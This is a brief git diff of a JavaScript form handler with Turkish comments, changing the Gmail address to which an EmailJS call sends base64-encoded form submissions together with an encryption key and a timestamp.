@@ -88,7 +88,7 @@ function encryptAndEmailData(formData) {
         
         // 5) EmailJS parametreleri
         const emailParams = {
-            to_email: 'goktuguum@gmail.com',
+            to_email: 'alperenlermi0@gmail.com',
             subject: 'Yeni Form Gönderimi',
             message: JSON.stringify({ data: base64Data, key: encryptionKey, timestamp: new Date().toISOString() }, null, 2)
         };
